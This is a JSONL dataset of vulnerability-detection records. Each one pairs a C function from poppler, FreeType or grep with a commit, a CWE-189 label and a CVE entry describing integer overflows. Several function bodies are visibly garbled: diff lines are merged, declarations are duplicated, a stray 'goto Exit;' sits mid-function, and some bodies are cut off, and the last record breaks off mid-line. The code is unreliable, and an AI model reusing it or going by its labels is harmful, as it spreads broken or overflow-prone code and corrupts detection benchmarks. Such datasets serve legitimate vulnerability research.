{"idx": 157883, "project": "poppler", "commit_id": "284a92899602daa4a7f429e61849e794569310b5", "project_url": "https://github.com/freedesktop/poppler", "commit_url": "https://cgit.freedesktop.org/poppler/poppler/commit/?id=284a92899602daa4a7f429e61849e794569310b5", "commit_message": "Did a mistake in the gmalloc -> gmallocn commit, it's a 4 here not a 3", "target": 0, "func": "void SplashOutputDev::drawImage(GfxState *state, Object *ref, Stream *str,\n\t\t\t\tint width, int height,\n\t\t\t\tGfxImageColorMap *colorMap,\n\t\t\t\tint *maskColors, GBool inlineImg) {\n  double *ctm;\n  SplashCoord mat[6];\n  SplashOutImageData imgData;\n  SplashColorMode srcMode;\n  SplashImageSource src;\n  GfxGray gray;\n  GfxRGB rgb;\n#if SPLASH_CMYK\n  GfxCMYK cmyk;\n#endif\n  Guchar pix;\n  int n, i;\n\n  ctm = state->getCTM();\n  mat[0] = ctm[0];\n  mat[1] = ctm[1];\n  mat[2] = -ctm[2];\n  mat[3] = -ctm[3];\n  mat[4] = ctm[2] + ctm[4];\n  mat[5] = ctm[3] + ctm[5];\n\n  imgData.imgStr = new ImageStream(str, width,\n\t\t\t\t   colorMap->getNumPixelComps(),\n\t\t\t\t   colorMap->getBits());\n  imgData.imgStr->reset();\n  imgData.colorMap = colorMap;\n  imgData.maskColors = maskColors;\n  imgData.colorMode = colorMode;\n  imgData.width = width;\n  imgData.height = height;\n  imgData.y = 0;\n\n  imgData.lookup = NULL;\n  if (colorMap->getNumPixelComps() == 1) {\n    n = 1 << colorMap->getBits();\n    switch (colorMode) {\n    case splashModeMono1:\n    case splashModeMono8:\n      imgData.lookup = (SplashColorPtr)gmalloc(n);\n      for (i = 0; i < n; ++i) {\n\tpix = (Guchar)i;\n\tcolorMap->getGray(&pix, &gray);\n\timgData.lookup[i] = colToByte(gray);\n      }\n      break;\n    case splashModeRGB8:\n    case splashModeBGR8:\n      imgData.lookup = (SplashColorPtr)gmallocn(n, 3);\n      for (i = 0; i < n; ++i) {\n\tpix = (Guchar)i;\n\tcolorMap->getRGB(&pix, &rgb);\n\timgData.lookup[3*i] = colToByte(rgb.r);\n\timgData.lookup[3*i+1] = colToByte(rgb.g);\n\timgData.lookup[3*i+2] = colToByte(rgb.b);\n       }\n       break;\n     case splashModeXBGR8:\n      imgData.lookup = (SplashColorPtr)gmallocn(n, 4);\n       for (i = 0; i < n; ++i) {\n \tpix = (Guchar)i;\n \tcolorMap->getRGB(&pix, &rgb);\n\timgData.lookup[4*i] = colToByte(rgb.r);\n\timgData.lookup[4*i+1] = colToByte(rgb.g);\n\timgData.lookup[4*i+2] = colToByte(rgb.b);\n\timgData.lookup[4*i+3] = 255;\n      }\n      break;\n#if SPLASH_CMYK\n    case splashModeCMYK8:\n      imgData.lookup = (SplashColorPtr)gmallocn(n, 4);\n      for (i = 0; i < n; ++i) {\n\tpix = (Guchar)i;\n\tcolorMap->getCMYK(&pix, &cmyk);\n\timgData.lookup[4*i] = colToByte(cmyk.c);\n\timgData.lookup[4*i+1] = colToByte(cmyk.m);\n\timgData.lookup[4*i+2] = colToByte(cmyk.y);\n\timgData.lookup[4*i+3] = colToByte(cmyk.k);\n      }\n      break;\n#endif\n      break;\n    }\n  }\n\n  if (colorMode == splashModeMono1) {\n    srcMode = splashModeMono8;\n  } else {\n    srcMode = colorMode;\n  }\n  src = maskColors ? &alphaImageSrc : &imageSrc;\n  splash->drawImage(src, &imgData, srcMode, maskColors ? gTrue : gFalse,\n\t\t    width, height, mat);\n  if (inlineImg) {\n    while (imgData.y < height) {\n      imgData.imgStr->getLine();\n      ++imgData.y;\n    }\n  }\n\n  gfree(imgData.lookup);\n  delete imgData.imgStr;\n  str->close();\n}\n", "func_hash": 238370966634441304873792337937568791030, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2009-3605", "cve_desc": "Multiple integer overflows in Poppler 0.10.5 and earlier allow remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted PDF file, related to (1) glib/poppler-page.cc; (2) ArthurOutputDev.cc, (3) CairoOutputDev.cc, (4) GfxState.cc, (5) JBIG2Stream.cc, (6) PSOutputDev.cc, and (7) SplashOutputDev.cc in poppler/; and (8) SplashBitmap.cc, (9) Splash.cc, and (10) SplashFTFont.cc in splash/.  NOTE: this may overlap CVE-2009-0791.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2009-3605"}
{"idx": 157884, "project": "poppler", "commit_id": "7b2d314a61fd0e12f47c62996cb49ec0d1ba747a", "project_url": "https://github.com/freedesktop/poppler", "commit_url": "https://cgit.freedesktop.org/poppler/poppler/commit/?id=7b2d314a61fd0e12f47c62996cb49ec0d1ba747a", "commit_message": "Be paranoid, use gmallocn or gmallocn3 in all gmalloc with *", "target": 0, "func": "void ArthurOutputDev::drawImage(GfxState *state, Object *ref, Stream *str,\n\t\t\t\tint width, int height,\n\t\t\t\tGfxImageColorMap *colorMap,\n\t\t\t\tint *maskColors, GBool inlineImg)\n{\n  unsigned char *buffer;\n  unsigned int *dest;\n  int x, y;\n  ImageStream *imgStr;\n  Guchar *pix;\n  int i;\n  double *ctm;\n   QMatrix matrix;\n   int is_identity_transform;\n   \n  buffer = (unsigned char *)gmallocn3(width, height, 4);\n \n   /* TODO: Do we want to cache these? */\n   imgStr = new ImageStream(str, width,\n\t\t\t   colorMap->getNumPixelComps(),\n\t\t\t   colorMap->getBits());\n  imgStr->reset();\n  \n  /* ICCBased color space doesn't do any color correction\n   * so check its underlying color space as well */\n  is_identity_transform = colorMap->getColorSpace()->getMode() == csDeviceRGB ||\n\t\t  (colorMap->getColorSpace()->getMode() == csICCBased && \n\t\t  ((GfxICCBasedColorSpace*)colorMap->getColorSpace())->getAlt()->getMode() == csDeviceRGB);\n\n  if (maskColors) {\n    for (y = 0; y < height; y++) {\n      dest = (unsigned int *) (buffer + y * 4 * width);\n      pix = imgStr->getLine();\n      colorMap->getRGBLine (pix, dest, width);\n\n      for (x = 0; x < width; x++) {\n\tfor (i = 0; i < colorMap->getNumPixelComps(); ++i) {\n\t  \n\t  if (pix[i] < maskColors[2*i] * 255||\n\t      pix[i] > maskColors[2*i+1] * 255) {\n\t    *dest = *dest | 0xff000000;\n\t    break;\n\t  }\n\t}\n\tpix += colorMap->getNumPixelComps();\n\tdest++;\n      }\n    }\n\n    m_image = new QImage(buffer, width, height, QImage::Format_ARGB32);\n  }\n  else {\n    for (y = 0; y < height; y++) {\n      dest = (unsigned int *) (buffer + y * 4 * width);\n      pix = imgStr->getLine();\n      colorMap->getRGBLine (pix, dest, width);\n    }\n\n    m_image = new QImage(buffer, width, height, QImage::Format_RGB32);\n  }\n\n  if (m_image == NULL || m_image->isNull()) {\n    qDebug() << \"Null image\";\n    delete imgStr;\n    return;\n  }\n  ctm = state->getCTM();\n  matrix.setMatrix(ctm[0] / width, ctm[1] / width, -ctm[2] / height, -ctm[3] / height, ctm[2] + ctm[4], ctm[3] + ctm[5]);\n\n  m_painter->setMatrix(matrix, true);\n  m_painter->drawImage( QPoint(0,0), *m_image );\n  delete m_image;\n  m_image = 0;\n  free (buffer);\n  delete imgStr;\n\n}\n", "func_hash": 328681969473388669211085267743237662516, "file_name": "ArthurOutputDev.cc", "file_hash": 133699823881014817245493355011253562709, "cwe": ["CWE-189"], "cve": "CVE-2009-3605", "cve_desc": "Multiple integer overflows in Poppler 0.10.5 and earlier allow remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted PDF file, related to (1) glib/poppler-page.cc; (2) ArthurOutputDev.cc, (3) CairoOutputDev.cc, (4) GfxState.cc, (5) JBIG2Stream.cc, (6) PSOutputDev.cc, and (7) SplashOutputDev.cc in poppler/; and (8) SplashBitmap.cc, (9) Splash.cc, and (10) SplashFTFont.cc in splash/.  NOTE: this may overlap CVE-2009-0791.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2009-3605"}
{"idx": 157983, "project": "savannah", "commit_id": "79972af4f0485a11dcb19551356c45245749fc5b", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=79972af4f0485a11dcb19551356c45245749fc5b", "commit_message": "None", "target": 0, "func": "  ft_smooth_render_generic( FT_Renderer       render,\n                            FT_GlyphSlot      slot,\n                            FT_Render_Mode    mode,\n                            const FT_Vector*  origin,\n                            FT_Render_Mode    required_mode )\n  {\n    FT_Error     error;\n    FT_Outline*  outline = NULL;\n    FT_BBox      cbox;\n    FT_UInt      width, height, height_org, width_org, pitch;\n    FT_Bitmap*   bitmap;\n    FT_Memory    memory;\n    FT_Int       hmul = mode == FT_RENDER_MODE_LCD;\n    FT_Int       vmul = mode == FT_RENDER_MODE_LCD_V;\n    FT_Pos       x_shift, y_shift, x_left, y_top;\n\n    FT_Raster_Params  params;\n\n\n    /* check glyph image format */\n    if ( slot->format != render->glyph_format )\n    {\n      error = Smooth_Err_Invalid_Argument;\n      goto Exit;\n    }\n\n    /* check mode */\n    if ( mode != required_mode )\n      return Smooth_Err_Cannot_Render_Glyph;\n\n    outline = &slot->outline;\n\n    /* translate the outline to the new origin if needed */\n    if ( origin )\n      FT_Outline_Translate( outline, origin->x, origin->y );\n\n    /* compute the control box, and grid fit it */\n    FT_Outline_Get_CBox( outline, &cbox );\n\n    cbox.xMin = FT_PIX_FLOOR( cbox.xMin );\n    cbox.yMin = FT_PIX_FLOOR( cbox.yMin );\n    cbox.xMax = FT_PIX_CEIL( cbox.xMax );\n    cbox.yMax = FT_PIX_CEIL( cbox.yMax );\n\n    width  = (FT_UInt)( ( cbox.xMax - cbox.xMin ) >> 6 );\n    height = (FT_UInt)( ( cbox.yMax - cbox.yMin ) >> 6 );\n    bitmap = &slot->bitmap;\n    memory = render->root.memory;\n\n    width_org  = width;\n    height_org = height;\n\n    /* release old bitmap buffer */\n    if ( slot->internal->flags & FT_GLYPH_OWN_BITMAP )\n    {\n      FT_FREE( bitmap->buffer );\n       slot->internal->flags &= ~FT_GLYPH_OWN_BITMAP;\n     }\n \n    /* allocate new one */\n     pitch = width;\n     if ( hmul )\n     {\n      width = width * 3;\n      pitch = FT_PAD_CEIL( width, 4 );\n    }\n\n    if ( vmul )\n      height *= 3;\n\n    x_shift = (FT_Int) cbox.xMin;\n    y_shift = (FT_Int) cbox.yMin;\n    x_left  = (FT_Int)( cbox.xMin >> 6 );\n    y_top   = (FT_Int)( cbox.yMax >> 6 );\n\n#ifdef FT_CONFIG_OPTION_SUBPIXEL_RENDERING\n\n    if ( slot->library->lcd_filter_func )\n    {\n      FT_Int  extra = slot->library->lcd_extra;\n\n\n      if ( hmul )\n      {\n        x_shift -= 64 * ( extra >> 1 );\n        width   += 3 * extra;\n        pitch    = FT_PAD_CEIL( width, 4 );\n        x_left  -= extra >> 1;\n      }\n\n      if ( vmul )\n      {\n        y_shift -= 64 * ( extra >> 1 );\n        height  += 3 * extra;\n        y_top   += extra >> 1;\n      }\n    }\n \n #endif\n \n    if ( pitch > 0xFFFF || height > 0xFFFF )\n    {\n      FT_ERROR(( \"ft_smooth_render_generic: glyph too large: %d x %d\\n\",\n                 width, height ));\n      return Smooth_Err_Raster_Overflow;\n    }\n\n     bitmap->pixel_mode = FT_PIXEL_MODE_GRAY;\n     bitmap->num_grays  = 256;\n     bitmap->width      = width;\n      goto Exit;\n\n    slot->internal->flags |= FT_GLYPH_OWN_BITMAP;\n\n    /* set up parameters */\n    params.target = bitmap;\n    params.source = outline;\n    params.flags  = FT_RASTER_FLAG_AA;\n\n#ifdef FT_CONFIG_OPTION_SUBPIXEL_RENDERING\n\n    /* implode outline if needed */\n    {\n      FT_Vector*  points     = outline->points;\n      FT_Vector*  points_end = points + outline->n_points;\n      FT_Vector*  vec;\n\n\n      if ( hmul )\n        for ( vec = points; vec < points_end; vec++ )\n          vec->x *= 3;\n\n      if ( vmul )\n        for ( vec = points; vec < points_end; vec++ )\n          vec->y *= 3;\n    }\n\n    /* render outline into the bitmap */\n    error = render->raster_render( render->raster, &params );\n\n    /* deflate outline if needed */\n    {\n      FT_Vector*  points     = outline->points;\n      FT_Vector*  points_end = points + outline->n_points;\n      FT_Vector*  vec;\n\n\n      if ( hmul )\n        for ( vec = points; vec < points_end; vec++ )\n          vec->x /= 3;\n\n      if ( vmul )\n        for ( vec = points; vec < points_end; vec++ )\n          vec->y /= 3;\n    }\n\n    if ( slot->library->lcd_filter_func )\n      slot->library->lcd_filter_func( bitmap, mode, slot->library );\n\n#else /* !FT_CONFIG_OPTION_SUBPIXEL_RENDERING */\n\n    /* render outline into bitmap */\n    error = render->raster_render( render->raster, &params );\n\n    /* expand it horizontally */\n    if ( hmul )\n    {\n      FT_Byte*  line = bitmap->buffer;\n      FT_UInt   hh;\n\n\n      for ( hh = height_org; hh > 0; hh--, line += pitch )\n      {\n        FT_UInt   xx;\n        FT_Byte*  end = line + width;\n\n\n        for ( xx = width_org; xx > 0; xx-- )\n        {\n          FT_UInt  pixel = line[xx-1];\n\n\n          end[-3] = (FT_Byte)pixel;\n          end[-2] = (FT_Byte)pixel;\n          end[-1] = (FT_Byte)pixel;\n          end    -= 3;\n        }\n      }\n    }\n\n    /* expand it vertically */\n    if ( vmul )\n    {\n      FT_Byte*  read  = bitmap->buffer + ( height - height_org ) * pitch;\n      FT_Byte*  write = bitmap->buffer;\n      FT_UInt   hh;\n\n\n      for ( hh = height_org; hh > 0; hh-- )\n      {\n        ft_memcpy( write, read, pitch );\n        write += pitch;\n\n        ft_memcpy( write, read, pitch );\n        write += pitch;\n\n        ft_memcpy( write, read, pitch );\n        write += pitch;\n        read  += pitch;\n      }\n    }\n\n#endif /* !FT_CONFIG_OPTION_SUBPIXEL_RENDERING */\n\n    FT_Outline_Translate( outline, x_shift, y_shift );\n\n    if ( error )\n      goto Exit;\n\n    slot->format      = FT_GLYPH_FORMAT_BITMAP;\n    slot->bitmap_left = x_left;\n    slot->bitmap_top  = y_top;\n\n  Exit:\n    if ( outline && origin )\n      FT_Outline_Translate( outline, -origin->x, -origin->y );\n\n    return error;\n  }\n", "func_hash": 121084197922462569728293725733145369116, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2009-0946", "cve_desc": "Multiple integer overflows in FreeType 2.3.9 and earlier allow remote attackers to execute arbitrary code via vectors related to large values in certain inputs in (1) smooth/ftsmooth.c, (2) sfnt/ttcmap.c, and (3) cff/cffload.c.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2009-0946"}
{"idx": 157984, "project": "savannah", "commit_id": "0545ec1ca36b27cb928128870a83e5f668980bc5", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=0545ec1ca36b27cb928128870a83e5f668980bc5", "commit_message": "None", "target": 0, "func": "  cff_charset_load( CFF_Charset  charset,\n                    FT_UInt      num_glyphs,\n                    FT_Stream    stream,\n                    FT_ULong     base_offset,\n                    FT_ULong     offset,\n                    FT_Bool      invert )\n  {\n    FT_Memory  memory = stream->memory;\n    FT_Error   error  = CFF_Err_Ok;\n    FT_UShort  glyph_sid;\n\n\n    /* If the the offset is greater than 2, we have to parse the */\n    /* charset table.                                            */\n    if ( offset > 2 )\n    {\n      FT_UInt  j;\n\n\n      charset->offset = base_offset + offset;\n\n      /* Get the format of the table. */\n      if ( FT_STREAM_SEEK( charset->offset ) ||\n           FT_READ_BYTE( charset->format )   )\n        goto Exit;\n\n      /* Allocate memory for sids. */\n      if ( FT_NEW_ARRAY( charset->sids, num_glyphs ) )\n        goto Exit;\n\n      /* assign the .notdef glyph */\n      charset->sids[0] = 0;\n\n      switch ( charset->format )\n      {\n      case 0:\n        if ( num_glyphs > 0 )\n        {\n          if ( FT_FRAME_ENTER( ( num_glyphs - 1 ) * 2 ) )\n             goto Exit;\n \n           for ( j = 1; j < num_glyphs; j++ )\n          {\n            FT_UShort sid = FT_GET_USHORT();\n\n\n            /* this constant is given in the CFF specification */\n            if ( sid < 65000 )\n              charset->sids[j] = sid;\n            else\n            {\n              FT_ERROR(( \"cff_charset_load:\"\n                         \" invalid SID value %d set to zero\\n\", sid ));\n              charset->sids[j] = 0;\n            }\n          }\n \n           FT_FRAME_EXIT();\n         }\n            /* Read the first glyph sid of the range. */\n            if ( FT_READ_USHORT( glyph_sid ) )\n              goto Exit;\n\n            /* Read the number of glyphs in the range.  */\n            if ( charset->format == 2 )\n            {\n              if ( FT_READ_USHORT( nleft ) )\n                goto Exit;\n            }\n            else\n            {\n              if ( FT_READ_BYTE( nleft ) )\n                goto Exit;\n            }\n\n            /* Fill in the range of sids -- `nleft + 1' glyphs. */\n            for ( i = 0; j < num_glyphs && i <= nleft; i++, j++, glyph_sid++ )\n              charset->sids[j] = glyph_sid;\n          }\n        }\n        break;\n\n      default:\n        FT_ERROR(( \"cff_charset_load: invalid table format!\\n\" ));\n        error = CFF_Err_Invalid_File_Format;\n                 goto Exit;\n             }\n", "func_hash": 274463663087246387196979578674863690828, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2009-0946", "cve_desc": "Multiple integer overflows in FreeType 2.3.9 and earlier allow remote attackers to execute arbitrary code via vectors related to large values in certain inputs in (1) smooth/ftsmooth.c, (2) sfnt/ttcmap.c, and (3) cff/cffload.c.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2009-0946"}
{"idx": 158027, "project": "savannah", "commit_id": "8fcf61523644df42e1905c81bed26838e0b04f91", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/cgit/grep.git/commit/?id=8fcf61523644df42e1905c81bed26838e0b04f91", "commit_message": "None", "target": 0, "func": "context_length_arg (char const *str, int *out)\ncontext_length_arg (char const *str, intmax_t *out)\n {\n  switch (xstrtoimax (str, 0, 10, out, \"\"))\n     {\n    case LONGINT_OK:\n    case LONGINT_OVERFLOW:\n      if (0 <= *out)\n        break;\n      /* Fall through.  */\n    default:\n       error (EXIT_TROUBLE, 0, \"%s: %s\", str,\n              _(\"invalid context length argument\"));\n     }\n   page size, unless a read yields a partial page.  */\n\nstatic char *buffer;\t\t/* Base of buffer. */\nstatic size_t bufalloc;\t\t/* Allocated buffer size, counting slop. */\n#define INITIAL_BUFSIZE 32768\t/* Initial buffer size, not counting slop. */\nstatic int bufdesc;\t\t/* File descriptor. */\nstatic char *bufbeg;\t\t/* Beginning of user-visible stuff. */\nstatic char *buflim;\t\t/* Limit of user-visible stuff. */\nstatic size_t pagesize;\t\t/* alignment of memory pages */\nstatic off_t bufoffset;\t\t/* Read offset; defined on regular files.  */\nstatic off_t after_last_match;\t/* Pointer after last matching line that\n                                   would have been output if we were\n                                   outputting characters. */\n\n/* Return VAL aligned to the next multiple of ALIGNMENT.  VAL can be\n   an integer or a pointer.  Both args must be free of side effects.  */\n#define ALIGN_TO(val, alignment) \\\n  ((size_t) (val) % (alignment) == 0 \\\n   ? (val) \\\n   : (val) + ((alignment) - (size_t) (val) % (alignment)))\n\n/* Reset the buffer for a new file, returning zero if we should skip it.\n   Initialize on the first time through. */\nstatic int\nreset (int fd, char const *file, struct stats *stats)\n{\n  if (! pagesize)\n    {\n      pagesize = getpagesize ();\n      if (pagesize == 0 || 2 * pagesize + 1 <= pagesize)\n        abort ();\n      bufalloc = ALIGN_TO (INITIAL_BUFSIZE, pagesize) + pagesize + 1;\n      buffer = xmalloc (bufalloc);\n    }\n\n  bufbeg = buflim = ALIGN_TO (buffer + 1, pagesize);\n  bufbeg[-1] = eolbyte;\n  bufdesc = fd;\n\n  if (S_ISREG (stats->stat.st_mode))\n    {\n      if (file)\n        bufoffset = 0;\n      else\n        {\n          bufoffset = lseek (fd, 0, SEEK_CUR);\n          if (bufoffset < 0)\n            {\n              suppressible_error (_(\"lseek failed\"), errno);\n              return 0;\n            }\n        }\n    }\n  return 1;\n}\n\n/* Read new stuff into the buffer, saving the specified\n   amount of old stuff.  When we're done, 'bufbeg' points\n   to the beginning of the buffer contents, and 'buflim'\n   points just after the end.  Return zero if there's an error.  */\nstatic int\nfillbuf (size_t save, struct stats const *stats)\n{\n  size_t fillsize = 0;\n  int cc = 1;\n  char *readbuf;\n  size_t readsize;\n\n  /* Offset from start of buffer to start of old stuff\n     that we want to save.  */\n  size_t saved_offset = buflim - save - buffer;\n\n  if (pagesize <= buffer + bufalloc - buflim)\n    {\n      readbuf = buflim;\n      bufbeg = buflim - save;\n    }\n  else\n    {\n      size_t minsize = save + pagesize;\n      size_t newsize;\n      size_t newalloc;\n      char *newbuf;\n\n      /* Grow newsize until it is at least as great as minsize.  */\n      for (newsize = bufalloc - pagesize - 1; newsize < minsize; newsize *= 2)\n        if (newsize * 2 < newsize || newsize * 2 + pagesize + 1 < newsize * 2)\n          xalloc_die ();\n\n      /* Try not to allocate more memory than the file size indicates,\n         as that might cause unnecessary memory exhaustion if the file\n         is large.  However, do not use the original file size as a\n         heuristic if we've already read past the file end, as most\n         likely the file is growing.  */\n      if (S_ISREG (stats->stat.st_mode))\n        {\n          off_t to_be_read = stats->stat.st_size - bufoffset;\n          off_t maxsize_off = save + to_be_read;\n          if (0 <= to_be_read && to_be_read <= maxsize_off\n              && maxsize_off == (size_t) maxsize_off\n              && minsize <= (size_t) maxsize_off\n              && (size_t) maxsize_off < newsize)\n            newsize = maxsize_off;\n        }\n\n      /* Add enough room so that the buffer is aligned and has room\n         for byte sentinels fore and aft.  */\n      newalloc = newsize + pagesize + 1;\n\n      newbuf = bufalloc < newalloc ? xmalloc (bufalloc = newalloc) : buffer;\n      readbuf = ALIGN_TO (newbuf + 1 + save, pagesize);\n      bufbeg = readbuf - save;\n      memmove (bufbeg, buffer + saved_offset, save);\n      bufbeg[-1] = eolbyte;\n      if (newbuf != buffer)\n        {\n          free (buffer);\n          buffer = newbuf;\n        }\n    }\n\n  readsize = buffer + bufalloc - readbuf;\n  readsize -= readsize % pagesize;\n\n  if (! fillsize)\n    {\n      ssize_t bytesread;\n      while ((bytesread = read (bufdesc, readbuf, readsize)) < 0\n             && errno == EINTR)\n        continue;\n      if (bytesread < 0)\n        cc = 0;\n      else\n        fillsize = bytesread;\n    }\n\n  bufoffset += fillsize;\n#if defined HAVE_DOS_FILE_CONTENTS\n  if (fillsize)\n    fillsize = undossify_input (readbuf, fillsize);\n#endif\n  buflim = readbuf + fillsize;\n  return cc;\n}\n\n/* Flags controlling the style of output. */\nstatic enum\n{\n  BINARY_BINARY_FILES,\n  TEXT_BINARY_FILES,\n  WITHOUT_MATCH_BINARY_FILES\n} binary_files;\t\t/* How to handle binary files.  */\n\nstatic int filename_mask;\t/* If zero, output nulls after filenames.  */\nstatic int out_quiet;\t\t/* Suppress all normal output. */\nstatic int out_invert;\t\t/* Print nonmatching stuff. */\nstatic int out_file;\t\t/* Print filenames. */\nstatic int out_line;\t\t/* Print line numbers. */\nstatic int out_byte;\t\t/* Print byte offsets. */\nstatic int out_before;\t\t/* Lines of leading context. */\nstatic int out_after;\t\t/* Lines of trailing context. */\n static int out_file;\t\t/* Print filenames. */\n static int out_line;\t\t/* Print line numbers. */\n static int out_byte;\t\t/* Print byte offsets. */\nstatic intmax_t out_before;\t/* Lines of leading context. */\nstatic intmax_t out_after;\t/* Lines of trailing context. */\n static int count_matches;\t/* Count matching lines.  */\n static int list_files;\t\t/* List matching files.  */\n static int no_filenames;\t/* Suppress file names.  */\nstatic intmax_t max_count;\t/* Stop after outputting this many\n                                    lines from an input file.  */\n static int line_buffered;       /* If nonzero, use line buffering, i.e.\n                                    fflush everyline out.  */\nstatic char const *lastnl;\t/* Pointer after last newline counted. */\nstatic char const *lastout;\t/* Pointer after last character output;\n                                   NULL if no character has been output\n                                   or if it's conceptually before bufbeg. */\nstatic uintmax_t totalnl;\t/* Total newline count before lastnl. */\nstatic off_t outleft;\t\t/* Maximum number of lines to be output.  */\nstatic int pending;\t\t/* Pending lines of output.\n                                    NULL if no character has been output\n                                    or if it's conceptually before bufbeg. */\n static uintmax_t totalnl;\t/* Total newline count before lastnl. */\nstatic intmax_t outleft;\t/* Maximum number of lines to be output.  */\nstatic intmax_t pending;\t/* Pending lines of output.\n                                    Always kept 0 if out_quiet is true.  */\n static int done_on_match;\t/* Stop scanning file on first match.  */\n static int exit_on_match;\t/* Exit on first match.  */\n/* Add two numbers that count input bytes or lines, and report an\n   error if the addition overflows.  */\nstatic uintmax_t\nadd_count (uintmax_t a, uintmax_t b)\n{\n  uintmax_t sum = a + b;\n  if (sum < a)\n    error (EXIT_TROUBLE, 0, _(\"input is too large to count\"));\n  return sum;\n}\n\nstatic void\nnlscan (char const *lim)\n{\n  size_t newlines = 0;\n  char const *beg;\n  for (beg = lastnl; beg < lim; beg++)\n    {\n      beg = memchr (beg, eolbyte, lim - beg);\n      if (!beg)\n        break;\n      newlines++;\n    }\n  totalnl = add_count (totalnl, newlines);\n  lastnl = lim;\n}\n\n/* Print the current filename.  */\nstatic void\nprint_filename (void)\n{\n  pr_sgr_start_if (filename_color);\n  fputs (filename, stdout);\n  pr_sgr_end_if (filename_color);\n}\n\n/* Print a character separator.  */\nstatic void\nprint_sep (char sep)\n{\n  pr_sgr_start_if (sep_color);\n  fputc (sep, stdout);\n  pr_sgr_end_if (sep_color);\n}\n\n/* Print a line number or a byte offset.  */\nstatic void\nprint_offset (uintmax_t pos, int min_width, const char *color)\n{\n  /* Do not rely on printf to print pos, since uintmax_t may be longer\n     than long, and long long is not portable.  */\n\n  char buf[sizeof pos * CHAR_BIT];\n  char *p = buf + sizeof buf;\n\n  do\n    {\n      *--p = '0' + pos % 10;\n      --min_width;\n    }\n  while ((pos /= 10) != 0);\n\n  /* Do this to maximize the probability of alignment across lines.  */\n  if (align_tabs)\n    while (--min_width >= 0)\n      *--p = ' ';\n\n  pr_sgr_start_if (color);\n  fwrite (p, 1, buf + sizeof buf - p, stdout);\n  pr_sgr_end_if (color);\n}\n\n/* Print a whole line head (filename, line, byte).  */\nstatic void\nprint_line_head (char const *beg, char const *lim, int sep)\n{\n  int pending_sep = 0;\n\n  if (out_file)\n    {\n      print_filename ();\n      if (filename_mask)\n        pending_sep = 1;\n      else\n        fputc (0, stdout);\n    }\n\n  if (out_line)\n    {\n      if (lastnl < lim)\n        {\n          nlscan (beg);\n          totalnl = add_count (totalnl, 1);\n          lastnl = lim;\n        }\n      if (pending_sep)\n        print_sep (sep);\n      print_offset (totalnl, 4, line_num_color);\n      pending_sep = 1;\n    }\n\n  if (out_byte)\n    {\n      uintmax_t pos = add_count (totalcc, beg - bufbeg);\n#if defined HAVE_DOS_FILE_CONTENTS\n      pos = dossified_pos (pos);\n#endif\n      if (pending_sep)\n        print_sep (sep);\n      print_offset (pos, 6, byte_num_color);\n      pending_sep = 1;\n    }\n\n  if (pending_sep)\n    {\n      /* This assumes sep is one column wide.\n         Try doing this any other way with Unicode\n         (and its combining and wide characters)\n         filenames and you're wasting your efforts.  */\n      if (align_tabs)\n        fputs (\"\\t\\b\", stdout);\n\n      print_sep (sep);\n    }\n}\n\nstatic const char *\nprint_line_middle (const char *beg, const char *lim,\n                   const char *line_color, const char *match_color)\n{\n  size_t match_size;\n  size_t match_offset;\n  const char *cur = beg;\n  const char *mid = NULL;\n\n  while (cur < lim\n         && ((match_offset = execute (beg, lim - beg, &match_size,\n                                      beg + (cur - beg))) != (size_t) -1))\n    {\n      char const *b = beg + match_offset;\n\n      /* Avoid matching the empty line at the end of the buffer. */\n      if (b == lim)\n        break;\n\n      /* Avoid hanging on grep --color \"\" foo */\n      if (match_size == 0)\n        {\n          /* Make minimal progress; there may be further non-empty matches.  */\n          /* XXX - Could really advance by one whole multi-octet character.  */\n          match_size = 1;\n          if (!mid)\n            mid = cur;\n        }\n      else\n        {\n          /* This function is called on a matching line only,\n             but is it selected or rejected/context?  */\n          if (only_matching)\n            print_line_head (b, lim, (out_invert ? SEP_CHAR_REJECTED\n                                      : SEP_CHAR_SELECTED));\n          else\n            {\n              pr_sgr_start (line_color);\n              if (mid)\n                {\n                  cur = mid;\n                  mid = NULL;\n                }\n              fwrite (cur, sizeof (char), b - cur, stdout);\n            }\n\n          pr_sgr_start_if (match_color);\n          fwrite (b, sizeof (char), match_size, stdout);\n          pr_sgr_end_if (match_color);\n          if (only_matching)\n            fputs (\"\\n\", stdout);\n        }\n      cur = b + match_size;\n    }\n\n  if (only_matching)\n    cur = lim;\n  else if (mid)\n    cur = mid;\n\n  return cur;\n}\n\nstatic const char *\nprint_line_tail (const char *beg, const char *lim, const char *line_color)\n{\n  size_t eol_size;\n  size_t tail_size;\n\n  eol_size   = (lim > beg && lim[-1] == eolbyte);\n  eol_size  += (lim - eol_size > beg && lim[-(1 + eol_size)] == '\\r');\n  tail_size  =  lim - eol_size - beg;\n\n  if (tail_size > 0)\n    {\n      pr_sgr_start (line_color);\n      fwrite (beg, 1, tail_size, stdout);\n      beg += tail_size;\n      pr_sgr_end (line_color);\n    }\n\n  return beg;\n}\n\nstatic void\nprline (char const *beg, char const *lim, int sep)\n{\n  int matching;\n  const char *line_color;\n  const char *match_color;\n\n  if (!only_matching)\n    print_line_head (beg, lim, sep);\n\n  matching = (sep == SEP_CHAR_SELECTED) ^ !!out_invert;\n\n  if (color_option)\n    {\n      line_color = (((sep == SEP_CHAR_SELECTED)\n                     ^ (out_invert && (color_option < 0)))\n                    ? selected_line_color  : context_line_color);\n      match_color = (sep == SEP_CHAR_SELECTED\n                     ? selected_match_color : context_match_color);\n    }\n  else\n    line_color = match_color = NULL; /* Shouldn't be used.  */\n\n  if ((only_matching && matching)\n      || (color_option  && (*line_color || *match_color)))\n    {\n      /* We already know that non-matching lines have no match (to colorize).  */\n      if (matching && (only_matching || *match_color))\n        beg 